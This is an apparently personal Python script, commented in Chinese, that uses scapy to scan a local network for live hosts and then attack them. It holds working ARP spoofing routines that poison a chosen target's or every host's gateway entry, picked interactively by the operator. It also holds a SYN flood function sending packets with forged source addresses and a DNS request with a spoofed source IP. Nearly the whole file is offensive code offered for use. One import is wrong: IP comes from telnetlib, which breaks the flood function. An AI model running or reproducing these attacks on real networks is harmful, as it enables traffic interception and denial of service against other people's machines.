# coding:utf-8
# python3.6

from telnetlib import IP
from scapy.all import *
from time import sleep

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import TCP, UDP
from scapy.layers.l2 import Ether, ARP
from random import randrange


# 将一个列表内的元素都转成int
def intl(arr):
    return [int(i) for i in arr]


def strl(arr):
    return '.'.join([str(i) for i in arr])


# 对ip_mac对进行排序
def sort_ip_mac_pair(a):
    b = [[intl(i[0].split('.')), i[1]] for i in a]
    b.sort()
    return [[strl(i[0]), i[1]] for i in b]


def get_gw_and_self(netcard, gw_ip):
    p = Ether() / ARP(pdst=gw_ip)
    ans, unans = srp(p, iface=netcard, verbose=0)    # 会发送两次，一次广播，一次指定网关
    # ans, unans = srp(p, iface=netcard, verbose=0)  # 会发送两次，一次广播，一次指定网关
    for s, r in ans:
        # 解析收到的包，提取出需要的IP地址和MAC地址
        return {
            # 'gw_ip': r[ARP].psrc,
            'gw_mac': r[ARP].hwsrc,
            'self_ip': r[ARP].pdst,
            'self_mac': r[ARP].hwdst
        }


def get_self_ip_gw_win():
    # 扫描局域网，显示活跃主机
    for line in os.popen('route print'):
        # print 'line=', line
        s=line.strip()   # 去掉每行的空格
        if s.startswith('0.0.0.0'):
            slist=s.split()
            ip=slist[3]       # 本机IP
            gw=slist[2]       # 本机网关
            return ip, gw


def get_alive_host(netcard, gw_ip):
    # ARP广播, 探测局域网内的活动主机
    # 默认子网掩码为/24
    p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gw_ip+'/24')
    # ans 回复包， unans 未恢复的包
    ans, unans = srp(p, iface=netcard, timeout=2, verbose=0)
    print("一共扫描到%d台主机：" % len(ans))
    result = []
    for s, r in ans:
        # 解析收到的包，提取出需要的IP地址和MAC地址
        result.append([r[ARP].psrc, r[ARP].hwsrc])
    result = sort_ip_mac_pair(result)
    return result


# 通过询问 目标ip的mac 进行攻击，目标收到广播包后会回复本机其mac地址，同时目标会认为本机是网关，用本机发出的虚假Mac地址更新其arp表中的网关Mac
# 因为本机发出的ARP询问包中的源ip被换成网关ip了，但源mac并不是网关的mac，而局域网内是通过mac通信的，中毒后原本目标发给网关的数据包将会发到本机
def arp_attack_by_who_is(gw_ip, gw_mac, dst_ip, dst_mac, t):
    # 构造一个欺骗数据包，告诉被攻击者，本机是网关
    # 60:f8:1d:cd:1b:4a
    # f5:8b:32:62:9d:69
    # dst_mac = 'ff:ff:ff:ff:ff:ff'
    # Ether 中的 src留空（自动赋值为本机mac）或赋值为本机mac，否则无效？
    p = Ether(dst=dst_mac) / ARP(pdst=dst_ip, psrc=gw_ip)
    # p = Ether(dst=dst_mac, src='f5:8b:32:62:9d:69') / ARP(pdst=dst_ip, psrc=gw_ip)
    # p = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=dst_ip, psrc=gw)
    print("攻击开始，目标ip %s，目标Mac %s" % (dst_ip, dst_mac))
    for i in range(t):
        sendp(p, verbose=0)
        sleep(5)
    print("攻击结束。。。")


# 通过假装网关回复arp询问包，欺骗目标本机是网关
def arp_attack_by_is_at(gw_ip, gw_mac, dst_ip, dst_mac, t):
    # dst_mac = 'ff:ff:ff:ff:ff:ff' # 攻击所有主机
    p = Ether(dst=dst_mac, src=gw_mac) / \
          ARP(
            op=2,   # or "is-at", ARP响应
            # hwsrc=gw_mac,  # 虚假的网关mac
            # hwdst=dst_mac,  # 目标Mac
            psrc=gw_ip  # 网关IP
            # pdst=dst_ip  # 目标IP
        )

    print("攻击开始，目标ip %s，目标Mac %s" % (dst_ip, dst_mac))
    for i in range(t):
        sendp(p, verbose=0)
        sleep(5)
    print("攻击结束。。。")


def arp_attack(op, gw_ip, gw_mac, dst_ip, dst_mac, t):
    if op == 1:
        p = Ether(dst=dst_mac) / ARP(pdst=dst_ip, psrc=gw_ip)
    elif op == 2:
        p = Ether(dst=dst_mac, src=gw_mac) / ARP(op=2, psrc=gw_ip)  # gw_mac 为虚假网关的mac
    print("攻击开始，目标ip %s，目标Mac %s" % (dst_ip, dst_mac))
    for i in range(t):
        sendp(p, verbose=0)
        sleep(5)
    print("攻击结束。。。")


def arp_attack_test():
    # 打印出活跃主机的IP地址和MAC地址
    # self_ip, gw_ip = get_self_ip_gw_win()

    netcard = 'en0'     # 网卡
    gw_ip = '192.168.123.1'     # 网关
    temp = get_gw_and_self(netcard, gw_ip)

    self_ip = temp.get('self_ip')
    self_mac = temp.get('self_mac')
    gw_mac = temp.get('gw_mac')
    del temp

    # 获取局域网内的活动主机
    result = get_alive_host(netcard, gw_ip)
    i = 0
    for ip, mac in result:
        print('[%d]' % i, ip, "------>", mac)
        i += 1

    target = int(input("请输入攻击目标索引："))
    t = int(input("请输入攻击时间（S）:"))

    dst_ip = result[target][0]
    dst_mac = result[target][1]
    del result

    # arp_attack_by_who_is(gw_ip=gw_ip, gw_mac=None, dst_ip=result[target][0], dst_mac=result[target][1], t=t)
    # arp_attack_by_is_at(gw_ip=gw_ip, gw_mac=self_mac, dst_ip=result[target][0], dst_mac=result[target][1], t=t)
    unreal_mac = 'f9:8b:32:62:9d:69'
    dst_mac = 'ff:ff:ff:ff:ff:ff'   # 欺骗其它所有主机
    arp_attack(op=2, gw_ip=gw_ip, gw_mac=unreal_mac, dst_ip=dst_ip, dst_mac=dst_mac, t=t)


#  syn洪流攻击，不断发起连接请求，消耗目标资源
def syn_flood(dst_ip, dst_port):
    #  先任意伪造4个ip地址
    ips = ['11.1.1.2', '22.1.1.102', '33.1.1.2', '125.130.5.199']
    #  选择任意一个端口号
    # sums = 0
    print('\nattacking....')
    for src_port in range(1024, 65535):
        # while 1:
        # src_port = randrange(1024, 65535)
        index = randrange(4)
        ip_layer = IP(src=ips[index], dst=dst_ip)
        tcp_layer = TCP(sport=src_port, dport=int(dst_port), flags='S')
        send(ip_layer/tcp_layer, verbose=0)     # verbose:是否输出发送结果
        # sums += 1
        # print ('\r已发送：%s' % sum, end='')
        # print sums, '\r',      # 太快显示不出来


def dns_attack(dst_ip, src_ip):
    a = IP(dst='8.8.8.8', src='192.168.1.200')  # 192.168.1.200 为伪造的源ip
    b = UDP(dport=53)
    c = DNS(id=1, qr=0, opcode=0, tc=0, rd=1, qdcount=1, ancount=0, nscount=0, arcount=0)
    c.qd = DNSQR(qname='www.qq.com', qtype=1, qclass=1)
    p = a / b / c
    send(p)
# arp_attack_test()
# syn_flood('192.168.123.1', 80)
# https://www.freebuf.com/articles/4922.html
